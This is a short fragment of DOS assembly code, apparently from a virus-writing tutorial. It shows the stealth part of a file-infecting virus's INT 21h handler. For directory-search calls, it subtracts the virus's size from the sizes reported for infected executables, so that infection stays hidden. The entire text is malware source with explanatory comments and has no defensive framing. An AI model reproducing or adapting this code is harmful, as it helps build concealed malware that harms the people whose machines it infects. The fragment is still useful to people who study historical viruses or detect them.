
int_21:
           ....
           cmp ah,11h        ; this is a part of viral
                             ; INT 21h handler
           je DIR_STEALTH
           cmp ah,12h
           je DIR_STEALTH
           cmp ah,4eh
           je DTA_STEALTH
           cmp ah,4fh
           je DTA_STEALTH
           ....              ; here handler continiues

DIR_STEALTH:

        call    dos_emu      ; call original DOS handler of
                             ; INT 21h

        pushf
        pusha
        push    ds,es
        or      al,al        ; was the call successfull?
        jnz     exit_size_fcb


        mov     ah,2fh
        call    dos_emu      ; get DTA adress to ES:BX
        push    es
        pop     ds
        cmp     byte ptr [bx],0ff
        jne     FCB_not_extended
        add     bx,7
FCB_not_extended:
        call    test_4_executable
        jc      exit_size_fcb     ; if not executable, exit
        call    test_4_infection
        jc      exit_size_fcb     ; if not infected, exit
        call    test_min_size
        jc      exit_size_fcb     ; skip 2 small files


        sub     word ptr [bx+1dh],virus_size
        sbb     word ptr [bx+1fh],0

exit_size_fcb:
        pop     es
        pop     ds
        popa
        popf
        retf    2



DTA_STEALTH:
        call    dos_emu      ; call original DOS handler of
                             ; INT 21h

        pushf
        pusha
        push    ds,es
        or      al,al        ; was the call successfull?
        jnz     exit_size_fcb


        mov     ah,2fh
        call    dos_emu      ; get DTA adress to ES:BX
        push    es
        pop     ds

        call    test_4_executable
        jc      exit_size_dta     ; if not executable, exit
        call    test_4_infection
        jc      exit_size_dta     ; if not infected, exit
        call    test_min_size
        jc      exit_size_dta     ; skip 2 small files

        sub     word ptr [bx+1ah],virus_size
        sbb     word ptr [bx+1ch],0

exit_size_dta:
        pop es
        pop ds
        popa
        popf
        retf 2

